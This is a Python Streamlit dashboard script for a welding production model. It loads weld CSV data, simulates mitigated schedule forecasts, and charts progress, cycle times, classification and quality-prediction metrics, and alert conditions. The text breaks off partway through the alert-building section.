#from matplotlib.ticker import scale_range
from pydoc import plainpager
import streamlit as st
import pandas as pd
import numpy as np
import plotly.graph_objects as go
import plotly.express as px
from datetime import datetime, timedelta
import io

# Page configuration
st.set_page_config(
    page_title="Welding Production Model",
    page_icon="🔧",
    layout="wide"
)

@st.cache_data
def load_default_data():
    """Load the default welding data CSV file"""
    try:
        data = pd.read_csv('WeldData.csv')
        return process_weld_data(data)
    except FileNotFoundError:
        return None

@st.cache_data
def load_classification_data():
    """Load the classification graph data CSV file"""
    try:
        data = pd.read_csv('ClassificationGraph.csv', index_col='datetime', parse_dates=True)
        # Normalize column names: strip spaces and standardize case
 #       data.columns = [c.strip() for c in data.columns]
 #       # Coerce expected columns to numeric where present
 #       for col in ['PredWeldNumber', 'ActualWeldNumber', 'PredictionStart', 'WeldStart']:
 #           if col in data.columns:
 #               data[col] = pd.to_numeric(data[col], errors='coerce').fillna(0).astype(int)
        return data
    except FileNotFoundError:
        return None


@st.cache_data
def load_quality_data():
    """Load the default welding data CSV file"""
    try:
        data = pd.read_csv('QualityGraphData.csv') #, index_col='datetime_min', parse_dates=True
        return data
    except FileNotFoundError:
        return None

def process_weld_data(data):
    """Process welding data with date parsing and forecast calculations"""
    # Convert date columns
    data['datetime_min'] = pd.to_datetime(data['datetime_min'])
    data['datetime_max'] = pd.to_datetime(data['datetime_max'])
    data['StartTime'] = pd.to_datetime(data['StartTime'])
    data['EndTime'] = pd.to_datetime(data['EndTime'])
    data['ForecastStart'] = pd.to_datetime(data['ForecastStart'])
    data['ForecastEnd'] = pd.to_datetime(data['ForecastEnd'])
    data['SimulationStart'] = pd.to_datetime(data['SimulationStart'])
    data['SimulationEnd'] = pd.to_datetime(data['SimulationEnd'])
    
    
    Start = len(data['Duration'].dropna())
    MitigatedWait = pd.Timedelta(seconds = .75 * 4*5*9.5*60*60 / data.dropna().rolling("28D", on="datetime_min")["WeldNumber"].count().iloc[-1])
    MitigatedSetup = pd.Timedelta(seconds = data['EstSetupTime'].dropna().mean())
    MitigatedDuration = pd.Timedelta(seconds = data['Duration'].dropna().mean())
    MitigatedHours = 9
    BaseHours = 9
    MitigatedCycleTime = MitigatedWait + MitigatedSetup + MitigatedDuration
    
    for i in range(Start,len(data)):
        StartTime = data.loc[i-1,'SimulationEnd'] + MitigatedWait + MitigatedSetup 
        if StartTime.hour < 8 + MitigatedHours:
            data.loc[i,'SimulationStart'] = StartTime
            data.loc[i,'SimulationEnd'] = StartTime + MitigatedDuration
        else:
            data.loc[i,'SimulationStart'] = (StartTime + pd.Timedelta(days=1)).normalize() + pd.Timedelta(hours=8)
            data.loc[i,'SimulationEnd'] = data.loc[i,'SimulationStart'] + MitigatedDuration
            while data.loc[i,'SimulationEnd'].weekday() >= 5:  # 5 = Saturday, 6 = Sunday
                data.loc[i,'SimulationEnd'] += pd.Timedelta(days=1)

    
    return data

def create_completion_chart(data):
    """Create the main completion chart showing actual vs planned vs forecast"""
    fig = go.Figure()
    
    # Welds Completed (Actual)
    actual_data = data.dropna(subset=['datetime_max'])
    marker_sizes = actual_data['CycleTime'] / 60 if 'CycleTime' in actual_data.columns else None
    fig.add_trace(go.Scatter(
        x=actual_data['datetime_max'],
        y=actual_data['WeldNumber'],
        mode='lines+markers',
        name='Welds Completed',
        line=dict(color='#1f77b4', width=3),
        marker=dict(size=(marker_sizes.fillna(0) if marker_sizes is not None else 6), color="#1f77b4", sizemode="area", sizeref=actual_data['CycleTime'].mean()/60),
        hovertemplate=("Weld Number: %{y}<br>Cycle Time (min): %{marker.size:.0f}<extra></extra>" if marker_sizes is not None else None)
    ))
    
    # Original Plan
    fig.add_trace(go.Scatter(
        x=data['EndTime'],
        y=data['WeldNumber'],
        mode='lines',
        name='Original Plan',
        line=dict(color='rgba(0, 0, 0, 0.3)', width=2)
#        hoverinfo='y'
    ))
    
    # Forecast
    forecast_data = data.dropna(subset=['ForecastEnd'])
    if not forecast_data.empty:
        fig.add_trace(go.Scatter(
            x=forecast_data['ForecastEnd'],
            y=forecast_data['WeldNumber'],
            mode='lines',
            name='Current Forecast',
            line=dict(color='red', width=2, dash='dash')
        ))
    
    # Mitigated Forecast
    mitigated_data = data.dropna(subset=['SimulationEnd'])
    if not mitigated_data.empty:
        fig.add_trace(go.Scatter(
            x=mitigated_data['SimulationEnd'],
            y=mitigated_data['WeldNumber'],
            mode='lines',
            name='Mitigated Forecast',
            line=dict(color='green', width=2, dash='dot')
        ))
    
    fig.update_layout(
        title='Welding Progress: Actual vs Planned vs Forecast',
        xaxis_title='Date',
        xaxis_title_font=dict(size=18),
        yaxis_title='Weld Number',
        yaxis_title_font=dict(size=18),
        font=dict(size=18),
        title_font=dict(size=24, color="#003366", family="Arial"),        
        height=600,
        hovermode='x unified'
    )

    fig.update_xaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray", 
                     tickfont=dict(size=20))
    fig.update_yaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray",
                     tickfont=dict(size=20))

    fig.update_layout(legend=dict(font=dict(size=18),itemsizing="constant"))

    
    return fig

def create_cycle_time_chart(data):
    """Create cycle time analysis chart"""
    actual_data = data.dropna(subset=['CycleTime'])
    
    fig = go.Figure()
    
    fig.add_trace(go.Scatter(
        x=actual_data['WeldNumber'],
        y=actual_data['CycleTime'],
        mode='markers',
        name='Actual Cycle Time',
        marker=dict(
            color=actual_data['CycleTime'],
            colorscale='Viridis',
            size=8,
            colorbar=dict(title="Cycle Time (min)")
        )
    ))
    
    # Add planned cycle time line
    fig.add_hline(y=120, line_dash="dash", line_color="red", 
                  annotation_text="Planned Cycle Time (120 min)")
    
    fig.update_layout(
        title='Actual Cycle Time by Weld Number',
        xaxis_title='Weld Number',
        yaxis_title='Cycle Time (minutes)',
        height=400
    )
    
    return fig

def create_weld_rate_chart(data):
    """Create weld rate analysis chart"""
    actual_data = data.dropna(subset=['Energy'])
    
    fig = go.Figure()
    
    fig.add_trace(go.Scatter(
        x=actual_data['WeldNumber'],
        y=actual_data['Energy'],
        mode='markers',
        name='Weld Rate',
        marker=dict(
            color=actual_data['Energy'],
            colorscale='Plasma',
            size=8,
            colorbar=dict(title="Weld Energy (KJ)")
        )
    ))
    
    fig.update_layout(
        title='Weld Rate Performance by Weld Number',
        xaxis_title='Weld Number',
        yaxis_title='Weld Energy (KJ)',
        height=400
    )
    
    return fig

def calculate_key_metrics(data):
    """Calculate key performance metrics"""
    # Choose an available completion timestamp
    date_col = None
    for candidate in ['datetime_max', 'EndTime']:
        if candidate in data.columns:
            date_col = candidate
            break
    if date_col is None:
        return {
            'total_welds_completed': 0,
            'avg_cycle_time': 0,
            'avg_weld_rate': 0,
            'total_delays': 0,
            'avg_delay_days': 0,
            'rework_rate': 0,
            'excessive_wait_rate': 0,
            'anomaly_rate': 0,
            'avg_wait': 0,
            'avg_setup': 0,
            'avg_duration': 0,
        }
    
    actual_data = data.dropna(subset=[date_col])
    plan_data = data.loc[data['EndTime']<data['datetime_max'].max(),['WeldNumber','DesignWaitTime','DesignSetupTime','DesignDuration']].copy()


    if len(actual_data) == 0:
        return {
            'total_welds_completed': 0,
            'avg_cycle_time': 0,
            'avg_weld_rate': 0,
            'total_delays': 0,
            'avg_delay_days': 0,
            'rework_rate': 0,
            'excessive_wait_rate': 0,
            'anomaly_rate': 0
        }
    
    # Calculate delays
    actual_data = actual_data.copy()
    actual_data['delay_days'] = (actual_data['datetime_min'] - actual_data['EndTime']).dt.days
    actual_data['ActualWait'] = actual_data['WaitTimeCalc']

    
    metrics = {
        'total_welds_completed': actual_data['WeldNumber'].iloc[-1],
        'plan_welds_complete': plan_data['WeldNumber'].iloc[-1],
        'avg_cycle_time': actual_data['CycleTime'].mean()/60,
        'plan_cycle_time': (plan_data['DesignWaitTime'].mean()+plan_data['DesignSetupTime'].mean()+plan_data['DesignDuration'].mean())/60,
        'avg_wait': actual_data['WaitTimeCalc'].mean()/60,
        'plan_wait': plan_data['DesignWaitTime'].mean()/60, 
        'avg_setup': actual_data['EstSetupTime'].mean(),
        'plan_setup': plan_data['DesignSetupTime'].mean(),
        'avg_duration': actual_data['Duration'].mean(),
        'plan_duration': plan_data['DesignDuration'].mean(),
#        'total_delays': len(actual_data[actual_data['delay_days'] > 0]),
#        'avg_delay_days': actual_data['delay_days'].mean(),
        'rework_rate': 0,
        'work_in_progress': actual_data['WIP'].dropna().iloc[-1],
        'excessive_wait_rate': (actual_data['WaitTime']>actual_data['WaitTime'].median()*10).sum() / len(actual_data) * 100,
        'anomaly_rate': actual_data['QualityFlag'].sum() / len(actual_data) * 100
    }
    
    return metrics

def create_classification_graph(GraphData):
    """Create the weld classification graph"""
    fig = go.Figure()

    fig.add_trace(go.Scatter(x=GraphData.index, y=GraphData['PredWeldNumber'],
                             mode="lines", name="Model", marker=dict(color="#1f77b4")))

    fig.add_trace(go.Scatter(x=GraphData.index, y=GraphData['ActualWeldNumber'],
                             mode="lines", name="Actual", marker=dict(color="rgba(0, 0, 0, 0.3)")))

    # Make it "web app" style
    fig.update_layout(
        title="Weld Classification",
        yaxis_title="Welds",
        xaxis_title="",
        xaxis_title_font=dict(size=18),
        yaxis_title_font=dict(size=18),
        plot_bgcolor="white",
        paper_bgcolor="white",
        font=dict(size=18),
        title_font=dict(size=24, color="#003366", family="Arial"),
        hovermode="x unified",
        height=500
    )

    # Add gridlines
    fig.update_xaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray", 
                     tickfont=dict(size=20))
    fig.update_yaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray",
                     tickfont=dict(size=20))
    fig.update_layout(legend=dict(font=dict(size=18),itemsizing="constant"))


    return fig

def show_weld_classification(data):
    """Display the weld classification page"""
    st.header("🔍 Weld Classification Analysis")
    
    # Load classification data
    classification_data = load_classification_data()
    
    if classification_data is None:
        st.error("ClassificationGraph.csv file not found. Please ensure the file is in the same directory.")
        return
    
    st.subheader("Weld Classification Model vs Actual")
    
    # Create and display the classification graph
    classification_graph = create_classification_graph(classification_data)
    st.plotly_chart(classification_graph, use_container_width=True)
    
    # Classification metrics
    st.subheader("Classification Performance Metrics")

    # Calculate metrics
    if 'PredictionStart' in classification_data.columns and 'WeldStart' in classification_data.columns:
            # Calculate precision, recall, and f1-score
            # For regression tasks, we'll use a threshold-based approach
            pred_values = classification_data['PredictionStart']
            actual_values = classification_data['WeldStart']
            
            # Calculate precision (true positives / (true positives + false positives))
            # For regression, we consider predictions within threshold as "correct"
            correct_predictions = np.abs(pred_values - actual_values)
            TP = np.sum((pred_values == 1) & (actual_values == 1))
            FP = np.sum((pred_values == 1) & (actual_values == 0))
            FN = np.sum((pred_values == 0) & (actual_values == 1))
            precision = TP / (TP + FP) if (TP + FP) > 0 else 0
            recall = TP / (TP + FN) if (TP + FN) > 0 else 0
            
            
            # Calculate f1-score (harmonic mean of precision and recall)
            f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
            
            col1, col2, col3, col4 = st.columns(4)
            
            with col1:
                accuracy = max(0, 100 - (np.mean(np.abs(pred_values - actual_values)) / actual_values.mean() * 100))
                st.metric("Model Accuracy", f"{accuracy:.1f}%")

            with col2:
                st.metric("Precision", f"{precision:.3f}")
            
            with col3:
                st.metric("Recall", f"{recall:.3f}")
            
            with col4:
                st.metric("F1-Score", f"{f1_score:.3f}")
            
    
    # Data table
    st.subheader("Classification Data")
    
    # Display options
    col1, col2 = st.columns([3, 1])
    
    with col1:
        st.dataframe(classification_data, use_container_width=True, height=400)
    
    with col2:
        st.subheader("Data Summary")
        st.write(f"**Total Records:** {len(classification_data)}")
        
        if 'PredictionStart' in classification_data.columns:
            st.write(f"**Avg Predicted:** {classification_data['PredictionStart'].mean():.1f}")
        
        if 'WeldStart' in classification_data.columns:
            st.write(f"**Avg Actual:** {classification_data['WeldStart'].mean():.1f}")
        
        # Show available columns
        st.write("**Available Columns:**")
        for col in classification_data.columns:
            st.write(f"- {col}")
    
    # Analysis section
    st.subheader("Classification Analysis")
    
    # Create residual plot
    if 'PredictionStart' in classification_data.columns and 'WeldStart' in classification_data.columns:
        residuals = classification_data['WeldStart'] - classification_data['PredictionStart']
        
        fig_residuals = go.Figure()
        fig_residuals.add_trace(go.Scatter(
            x=classification_data.index,
            y=residuals,
            mode='markers',
            name='Residuals',
            marker=dict(color='red', size=6, opacity=0.7)
        ))
        
        # Add zero line
        fig_residuals.add_hline(y=0, line_dash="dash", line_color="black")
        
        fig_residuals.update_layout(
            title="Prediction Residuals (Actual - Predicted)",
            xaxis_title="Index",
            yaxis_title="Residuals",
            height=400
        )
        
        st.plotly_chart(fig_residuals, use_container_width=True)
    
    # Export functionality
    st.subheader("Export Data")
    
    if st.button("Download Classification Data as CSV"):
        csv = classification_data.to_csv(index=False)
        st.download_button(
            label="Download CSV",
            data=csv,
            file_name=f"classification_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            mime="text/csv"
        )

def create_quality_prediction_graph(data):
    """Create the quality prediction graph"""
    GraphData = data.copy()

    ## Classification Graph
    fig = go.Figure()

    fig.add_trace(go.Scatter(x=GraphData['datetime_min'], y=GraphData['Correctly Identified'],
                             mode="lines", name="Correctly Identified", marker=dict(color="#1f77b4")))

    fig.add_trace(go.Scatter(x=GraphData['datetime_min'], y=GraphData['Misclassfied'],
                             mode="lines", name="Misclassified", marker=dict(color="rgba(0, 0, 0, 0.3)")))

    # Make it "web app" style
    fig.update_layout(
        title = "Quality Prediction",
        yaxis_title="Welds",
        xaxis_title="",
        yaxis_title_font=dict(size=18),
        plot_bgcolor="white",
        paper_bgcolor="white",
        font=dict(size=18),
        title_font=dict(size=24, color="#003366", family="Arial"),
        hovermode="x unified",
        height=500
    )

    # Add gridlines
    fig.update_xaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray",
    tickfont=dict(size=20))
    fig.update_yaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray",
    tickfont=dict(size=20))
    fig.update_layout(legend=dict(font=dict(size=18),itemsizing="constant"))

    return fig, GraphData

def show_weld_quality_prediction(data):
    """Display the weld quality prediction page"""
    st.header("🎯 Weld Quality Prediction")
    
    # Check if required columns exist
    if 'datetime_min' not in data.columns or 'QualityFlag' not in data.columns:
        st.error("Required columns 'datetime_min' and 'QualityFlag' not found in data.")
        return

    QualityData = load_quality_data()
    
    st.subheader("Quality Prediction Model vs Actual")
    
    # Create and display the quality prediction graph
    quality_graph, graph_data = create_quality_prediction_graph(QualityData)
    st.plotly_chart(quality_graph, use_container_width=True)
    
    # Quality prediction metrics
    st.subheader("Quality Prediction Performance Metrics")
    
    # Calculate metrics
    correct_predictions = (graph_data['QualityPred'] == graph_data['QualityFlag']).sum()
    total_predictions = len(graph_data)
    accuracy = correct_predictions / total_predictions * 100
    
    # Calculate precision, recall, and f1-score
    TP = np.sum((graph_data['QualityPred'] == 1) & (graph_data['QualityFlag'] == 1))
    FP = np.sum((graph_data['QualityPred'] == 1) & (graph_data['QualityFlag'] == 0))
    FN = np.sum((graph_data['QualityPred'] == 0) & (graph_data['QualityFlag'] == 1))
    TN = np.sum((graph_data['QualityPred'] == 0) & (graph_data['QualityFlag'] == 0))
    
    precision = TP / (TP + FP) if (TP + FP) > 0 else 0
    recall = TP / (TP + FN) if (TP + FN) > 0 else 0
    f1_score = 2 * (precision * recall) / (precision + recall) if (precision + recall) > 0 else 0
    
    col1, col2, col3, col4 = st.columns(4)
    
    with col1:
        st.metric("Model Accuracy", f"{accuracy:.1f}%")
    
    with col2:
        st.metric("Precision", f"{precision:.3f}")
    
    with col3:
        st.metric("Recall", f"{recall:.3f}")
    
    with col4:
        st.metric("F1-Score", f"{f1_score:.3f}")
    
    # Data table
    st.subheader("Quality Prediction Data")
    
    # Display options
    col1, col2 = st.columns([3, 1])
    
    with col1:
        st.dataframe(graph_data, use_container_width=True, height=400)
    
    with col2:
        st.subheader("Data Summary")
        st.write(f"**Total Records:** {len(graph_data)}")
        st.write(f"**Correctly Identified:** {graph_data['Correctly Identified'].iloc[-1]}")
        st.write(f"**Misclassified:** {graph_data['Misclassfied'].iloc[-1]}")
        st.write(f"**Actual Quality Issues:** {graph_data['QualityFlag'].sum()}")
        st.write(f"**Predicted Quality Issues:** {graph_data['QualityPred'].sum()}")
        
        # Show available columns
        st.write("**Available Columns:**")
        for col in graph_data.columns:
            st.write(f"- {col}")
    
    # Analysis section
    st.subheader("Quality Prediction Analysis")
    
    # Create confusion matrix visualization
    confusion_matrix = np.array([[TN, FP], [FN, TP]])
    
    fig_confusion = go.Figure(data=go.Heatmap(
        z=confusion_matrix,
        x=['Predicted Good', 'Predicted Bad'],
        y=['Actual Good', 'Actual Bad'],
        colorscale='Blues',
        text=confusion_matrix,
        texttemplate="%{text}",
        textfont={"size": 20}
    ))
    
    fig_confusion.update_layout(
        title="Confusion Matrix",
        height=400
    )
    
    st.plotly_chart(fig_confusion, use_container_width=True)
    
    # Export functionality
    st.subheader("Export Data")
    
    if st.button("Download Quality Prediction Data as CSV"):
        csv = graph_data.to_csv(index=False)
        st.download_button(
            label="Download CSV",
            data=csv,
            file_name=f"quality_prediction_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            mime="text/csv"
        )

def main():
    st.title("🔧 Welding Production Model")
    
    # Sidebar for navigation
    st.sidebar.title("Navigation")
    page = st.sidebar.selectbox("Choose a page", ["Dashboard", "Optimization", "Data Analysis", "Weld Classification", "Weld Quality Prediction"])
    
    # Data upload section
    st.sidebar.header("Data Upload")
    uploaded_file = st.sidebar.file_uploader("Upload CSV file", type=['csv'])
    
    # Load data
    if uploaded_file is not None:
        data = pd.read_csv(uploaded_file)
        data = process_weld_data(data)
        st.sidebar.success("Custom data loaded successfully!")
    else:
        data = load_default_data()
        if data is not None:
            st.sidebar.info("Using default sample data")
        else:
            st.sidebar.error("No data available. Please upload a CSV file.")
            st.error("No data file found. Please upload a CSV file to continue.")
            return
    
    if page == "Dashboard":
        show_dashboard(data)
    elif page == "Optimization":
        show_optimization(data)
    elif page == "Data Analysis":
        show_data_analysis(data)
    elif page == "Weld Classification":
        show_weld_classification(data)
    else:  # Weld Quality Prediction
        show_weld_quality_prediction(data)

def apply_advanced_filters(data):
    """Apply advanced filtering options and return filtered data"""
    st.sidebar.header('Mitigating Forecast Parameters')

    BaseWait = int(np.rint(pd.Timedelta(seconds = .75*4*5*9.5*60*60 / data.dropna().rolling("28D", on="datetime_min")["WeldNumber"].count().iloc[-1]).total_seconds()/60))
    BaseSetup = int(np.rint(pd.Timedelta(seconds = data['EstSetupTime'].dropna().mean()).total_seconds()))
    BaseDuration = int(np.rint(pd.Timedelta(seconds = data['Duration'].dropna().mean()).total_seconds()))


    # Sliders for the requested variables
    MitigatedWait = st.sidebar.slider(
        'Mitigated Wait (min)',
        min_value=0,
        max_value=(BaseWait * 2),
        value=BaseWait,
        step=1
    )
    MitigatedSetup = st.sidebar.slider(
        'Mitigated Setup (sec)',
        min_value=0,
        max_value=BaseSetup*2,
        value=BaseSetup,
        step=1
    )
    MitigatedDuration = st.sidebar.slider(
        'Mitigated Duration (sec)',
        min_value=0,
        max_value=(BaseDuration*2),
        value=BaseDuration,
        step=1
    )
    MitigatedHours = st.sidebar.slider(
        'Mitigated Hours',
        min_value=7,
        max_value=12,
        value=9,
        step=1
    )
    MitigatedRework = st.sidebar.slider(
        'Mitigated Rework Rate (%)',
        min_value=0,
        max_value=25,
        value=0,
        step=1
    )

    MitigatedWait = pd.Timedelta(minutes = MitigatedWait / (1 - MitigatedRework/100))
    MitigatedSetup = pd.Timedelta(seconds = MitigatedSetup / (1 - MitigatedRework/100))
    MitigatedDuration = pd.Timedelta(seconds = MitigatedDuration / (1 - MitigatedRework/100))

    Start = len(data['Duration'].dropna())
    

    for i in range(Start,len(data)):
        StartTime = data.loc[i-1,'SimulationEnd'] + MitigatedWait + MitigatedSetup 
        if StartTime.hour < 8 + MitigatedHours:
            data.loc[i,'SimulationStart'] = StartTime
            data.loc[i,'SimulationEnd'] = StartTime + MitigatedDuration
        else:
            data.loc[i,'SimulationStart'] = (StartTime + pd.Timedelta(days=1)).normalize() + pd.Timedelta(hours=8)
            data.loc[i,'SimulationEnd'] = data.loc[i,'SimulationStart'] + MitigatedDuration
            while data.loc[i,'SimulationEnd'].weekday() >= 5:  # 5 = Saturday, 6 = Sunday
                data.loc[i,'SimulationEnd'] += pd.Timedelta(days=1)

    data.loc[data['WeldNumber'] < Start, ['ForecastEnd', 'SimulationEnd']] = np.nan
    
    
    st.sidebar.header("🔍 Advanced Filters")
    
    # Date range filter
    actual_dates = data['ForecastStart']#.dropna()
    if not actual_dates.empty:
        min_date = actual_dates.min().date()
        max_date = data['ForecastStart'].max().date()
        
        st.sidebar.subheader("Actual Date Range")
        date_range = st.sidebar.date_input(
            "Filter by Actual Start Date",
            value=(min_date, max_date),
            min_value=min_date,
            max_value=max_date
        )
        
        if len(date_range) == 2:
            start_date, end_date = date_range
            data = data[
                (data['ForecastStart'].dt.date >= start_date) &
                (data['ForecastStart'].dt.date <= end_date)
            ]

    # Weld number range filter (supports either 'WeldNumber' or 'Weld Number')
 #   weld_col = None
 #   if 'WeldNumber' in data.columns:
 #       weld_col = 'WeldNumber'
 #   elif 'Weld Number' in data.columns:
  #      weld_col = 'Weld Number'

    weld_col = 'WeldNumber'

    if weld_col is not None and not data[weld_col].dropna().empty:
        st.sidebar.subheader("Weld Number Range")
        min_weld = int(np.floor(data[weld_col].min()))
        max_weld = int(np.ceil(data[weld_col].max()))
        weld_range = st.sidebar.slider(
            "Select weld number range",
            min_value=min_weld,
            max_value=max_weld,
            value=(min_weld, max_weld),
            key="weld_number_range"
        )
        data = data[(data[weld_col] >= weld_range[0]) & (data[weld_col] <= weld_range[1])]

   # Critical Path filter
    st.sidebar.subheader("Critical Path")
    critical_path_options = ['All'] + sorted(data['Critical Path'].unique().tolist())
    selected_critical_path = st.sidebar.selectbox("Critical Path", critical_path_options)
    
    if selected_critical_path != 'All':
        data = data[data['Critical Path'] == selected_critical_path]

 

    return data

def create_welds_planned_vs_completed_chart(welds_planned, welds_completed):
    """Create a column chart comparing Welds Planned vs Welds Completed"""
    # Create the column chart
    fig = go.Figure()
    
    fig.add_trace(go.Bar(
        x=['Planned', 'Completed'],
        y=[welds_planned, welds_completed],
        marker_color=['#1f77b4', '#2ca02c'],
        text=[welds_planned, welds_completed],
        textposition='auto',
        textfont=dict(size=20)
    ))
    
    fig.update_layout(
        title='Welds Planned vs Welds Completed',
        xaxis_title='',
        yaxis_title='Number of Welds',
        xaxis_title_font=dict(size=18),
        yaxis_title_font=dict(size=18),
        font=dict(size=18),
        title_font=dict(size=24, color="#003366", family="Arial"),
        height=300,
        showlegend=False
    )
    
    fig.update_xaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray", 
                     tickfont=dict(size=20))
    fig.update_yaxes(showgrid=False, gridcolor="lightgray", showline=True, linecolor="lightgray",
                     tickfont=dict(size=20))
    
    return fig

def show_dashboard(data):
    """Display the main dashboard page with Welds Planned vs Completed chart"""
    st.header("Welding Operations Dashboard")
    
    filtered_data = data.copy()
    plan_data = data.copy()  # Initialize plan_data to avoid undefined variable error
    start_data = data[['WeldNumber','datetime_min','StartTime']].melt(id_vars = 'WeldNumber').copy()
    
    # Date completion filter (optional)
    if 'datetime_max' in filtered_data.columns and filtered_data['datetime_max'].notna().any():
        dates = filtered_data['datetime_max'].dropna()
        min_date = dates.min().date()
        max_date = dates.max().date()
        completion_date_range = st.date_input(
            "Completion Date Range",
            value=(min_date, max_date),
            min_value=min_date,
            max_value=max_date,
            key="analysis_completion_date_range"
        )
        # Separate out the plan timelines from the actuals (really should be a melt ideally with plan and actual vs. date)
        if isinstance(completion_date_range, (list, tuple)) and len(completion_date_range) == 2:
            start_date, end_date = completion_date_range
            plan_data = filtered_data[
                (filtered_data['StartTime'].dt.date >= start_date) &
                (filtered_data['StartTime'].dt.date <= end_date)
            ].copy()
            filtered_data = filtered_data[
                (filtered_data['datetime_max'].dt.date >= start_date) &
                (filtered_data['datetime_max'].dt.date <= end_date)
            ]
            start_data = start_data[
                (start_data['value'].dt.date >= start_date) &
                (start_data['value'].dt.date <= end_date)
            ]

    # Toggle to show/hide Notification Settings
    show_notifications = st.checkbox("Show Notification Settings", value=False, key="show_notifications")
    
    if show_notifications:
        st.subheader("Notification Settings")
        notification_options = ['Email', 'Text', 'Slack']
        
        # Row 1: Start Hour
        col1, col2, col3 = st.columns([2, 2, 3])
        with col1:
            st.write("**Start Hour**")
        with col2:
            start_hour_notification = st.selectbox("Notification Method", notification_options, key="start_hour_method")
        with col3:
            start_hour_threshold = st.slider("Threshold (hours)", min_value=0, max_value=24, value=8, key="start_hour_threshold")
        
        # Row 2: Max Wait Time
        col1, col2, col3 = st.columns([2, 2, 3])
        with col1:
            st.write("**Max Wait Time**")
        with col2:
            max_wait_notification = st.selectbox("Notification Method", notification_options, key="max_wait_method")
        with col3:
            max_wait_threshold = st.slider("Threshold (minutes)", min_value=0, max_value=240, value=60, key="max_wait_threshold")
        
        # Row 3: Mid-Day Progress
        col1, col2, col3 = st.columns([2, 2, 3])
        with col1:
            st.write("**Mid-Day Progress**")
        with col2:
            midday_notification = st.selectbox("Notification Method", notification_options, key="midday_method")
        with col3:
            midday_threshold = st.slider("Threshold (%)", min_value=0, max_value=100, value=50, key="midday_threshold")
        
        # Row 4: Anomaly
        col1, col2, col3 = st.columns([2, 2, 3])
        with col1:
            st.write("**Anomaly**")
        with col2:
            anomaly_notification = st.selectbox("Notification Method", notification_options, key="anomaly_method")
        with col3:
            anomaly_threshold = st.selectbox("Alert Active", ['True','False'], key="anomaly_threshold")
    else:
        # Use default values when section is hidden
        start_hour_threshold = 8
        max_wait_threshold = 60
        midday_threshold = 50
        anomaly_threshold = 'True'

    # Display summary metrics
    welds_planned = len(plan_data[plan_data['EndTime'].notna()])
    welds_completed = len(filtered_data[filtered_data['datetime_max'].notna()])
    completion_rate = (welds_completed / welds_planned * 100) if welds_planned > 0 else 0
    
    welds_chart = create_welds_planned_vs_completed_chart(welds_planned, welds_completed)
    st.plotly_chart(welds_chart, use_container_width=True)

    col1, col2, col3 = st.columns(3)
    
    with col1:
        st.metric(
            label="Welds Planned",
            value=welds_planned
        )
    
    with col2:
        st.metric(
            label="Welds Completed",
            value=welds_completed
        )
    
    with col3:
        st.metric(
            label="Completion Rate",
            value=f"{completion_rate:.1f}%"
        )


    start_alerts = filtered_data.loc[
        (filtered_data['datetime_min'].dt.hour > start_hour_threshold) & (filtered_data['datetime_min']==filtered_data.groupby(filtered_data['datetime_min'].dt.date)['datetime_min'].transform('min')),
        ['WeldNumber', 'datetime_min']
    ].copy()

    # Calculate planned welds per day
    planned_welds = plan_data.groupby(plan_data['EndTime'].dt.date)['WeldNumber'].count().reset_index()
    planned_welds.columns = ['date', 'planned_count']
    
    # calculate days where welds were planned but there were no actuals
    #start_data = filtered_data[['WeldNumber','datetime_min','StartTime']].melt(id_vars = 'WeldNumber')
    start_data = start_data.groupby([start_data['value'].dt.date,start_data['variable']])['WeldNumber'].max().unstack().reset_index()
    
    # Apply filter first, then check if result is empty
    if not start_data.empty and 'StartTime' in start_data.columns:
        start_data['value'] = pd.to_datetime(start_data['value']) + pd.Timedelta(hours = start_hour_threshold)
        
        # Handle case when filter returns empty DataFrame
        if not start_data.empty and 'datetime_min' in start_data.columns :
            start_data = start_data[(start_data['datetime_min'].isna()) & (start_data['StartTime']>0)]
            start_data = start_data[['datetime_min','value']]
            start_data.columns = ['WeldNumber','datetime_min']
            # Concatenate start_data to start_alerts
            start_alerts = pd.concat([start_alerts, start_data], ignore_index=True)
        else:
            start_alerts = start_data[['StartTime','value']]
            start_alerts['StartTime'] = np.nan
            start_alerts.columns = ['WeldNumber','datetime_min']
        # If filtered result is empty, skip concatenation (no alerts to add)
    # If start_data is empty or missing required columns, skip processing
    


    wait_alerts = filtered_data.loc[
        (filtered_data['WaitTime'] > max_wait_threshold * 60) & (filtered_data['WaitSameDayFlag']==1),
        ['WeldNumber', 'datetime_min']
    ].copy()
 
    # Calculate actual progress by noon (12:00) per day
    noon_time = pd.Timestamp("12:00:00").time()
    noon_progress = filtered_data[filtered_data['datetime_min'].dt.time <= noon_time].groupby(filtered_data['datetime_min'].dt.date)['WeldNumber'].agg(['count','max']).reset_index()
    #noon_progress['DailyWelds'] = filtered_data.groupby()
    noon_progress.columns = ['date', 'actual_count','WeldNumber']



    filtered_data[filtered_data['datetime_min'].dt.time <= noon_time].groupby(filtered_data['datetime_min'].dt.date)['WeldNumber'].count()
    
    
    # Merge and find days where progress is below target
    progress_comparison = planned_welds.merge(noon_progress, on='date', how='left')
    progress_comparison['actual_count'] = progress_comparison['actual_count'].fillna(0)
    progress_comparison['progress_pct'] = (progress_comparison['actual_count'] / progress_comparison['planned_count'] * 100).fillna(0)
    progress_comparison['datetime_min'] = pd.to_datetime(progress_comparison['date'])+pd.Timedelta(hours=12)

    
    # Get the actual weld records for those dates
    # Fix Bug 2: Use .any() or .sum() > 0 instead of len() on boolean Series
    if (progress_comparison['progress_pct'] < midday_threshold).any():
        progress_alerts = progress_comparison.loc[
            progress_comparison['progress_pct'] < midday_threshold,
            ['WeldNumber','datetime_min']]
    else:
        progress_alerts = pd.DataFrame(columns=['WeldNumber', 'datetime_min'])

    anomaly_alerts = filtered_data.loc[
        filtered_data['EnergyDelta'].abs() > .3,
        ['WeldNumber', 'datetime_min']
    ].copy()

    alerts_by_type = {
        "Start Hour": start_alerts,
        "Max Wait Time": wait_alerts,
        "Mid-Day Progress": progress_alerts,
        "Anomaly": anomaly_alerts,
    }

    # Concatenate all alerts with AlertType column
